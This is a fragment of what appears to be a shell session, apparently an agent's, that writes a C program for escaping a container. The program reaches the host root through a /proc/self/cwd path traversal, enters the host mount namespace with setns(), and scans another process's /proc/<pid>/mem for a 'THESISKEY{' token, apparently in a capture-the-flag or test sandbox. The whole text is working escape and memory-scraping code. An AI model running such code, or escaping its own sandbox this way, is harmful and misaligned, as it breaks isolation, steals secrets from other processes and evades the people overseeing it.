# We can open /proc/1/ns/pid via the host filesystem path
# Then use that fd with setns syscall

# Let's write a C program that:
# 1. Opens the host's /proc/1/ns/pid and /proc/1/ns/mnt via our escaped path
# 2. Uses setns() to enter those namespaces
# 3. Then reads /proc/1/mem directly

cat > /tmp/memread.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <sched.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

#define HOST_ROOT "/proc/self/cwd/../../../../../../../../../../"

int main(int argc, char *argv[]) {
    char path[512];
    int pid = atoi(argv[1] ? argv[1] : "1");

    printf("Trying to read memory of host PID %d\n", pid);

    // Try entering the host mount namespace
    snprintf(path, sizeof(path), HOST_ROOT "proc/1/ns/mnt");
    printf("Opening mnt ns: %s\n", path);
    int mnt_fd = open(path, O_RDONLY);
    if (mnt_fd < 0) {
        perror("open mnt ns");
    } else {
        printf("mnt_fd: %d\n", mnt_fd);
        if (setns(mnt_fd, CLONE_NEWNS) < 0) {
            perror("setns mnt");
        } else {
            printf("Entered host mount namespace!\n");
        }
        close(mnt_fd);
    }

    // Now try to open /proc/<pid>/mem directly (we should be in host mount ns now)
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    printf("Opening mem: %s\n", path);
    int mem_fd = open(path, O_RDONLY);
    if (mem_fd < 0) {
        perror("open mem");
        return 1;
    }
    printf("Opened mem fd: %d\n", mem_fd);

    // Read maps
    char maps_path[512];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    FILE *maps = fopen(maps_path, "r");
    if (!maps) {
        perror("open maps");
        close(mem_fd);
        return 1;
    }

    char line[256];
    while (fgets(line, sizeof(line), maps)) {
        unsigned long start, end;
        char perms[8];
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3) {
            if (perms[0] == 'r') {
                unsigned long size = end - start;
                if (size > 100*1024*1024) continue; // skip huge

                char *buf = malloc(size);
                if (!buf) continue;

                if (lseek(mem_fd, start, SEEK_SET) < 0) {
                    free(buf);
                    continue;
                }

                ssize_t n = read(mem_fd, buf, size);
                if (n > 0) {
                    // Search for THESISKEY
                    char *p = memmem(buf, n, "THESISKEY{", 10);
                    if (p) {
                        // Find end of token
                        char *end_p = memchr(p, '}', 200);
                        if (end_p) {
                            printf("*** FOUND TOKEN: %.*s}\n", (int)(end_p - p), p);
                        }
                    }
                }
                free(buf);
            }
        }
    }
    fclose(maps);
    close(mem_fd);
    return 0;
}
EOF
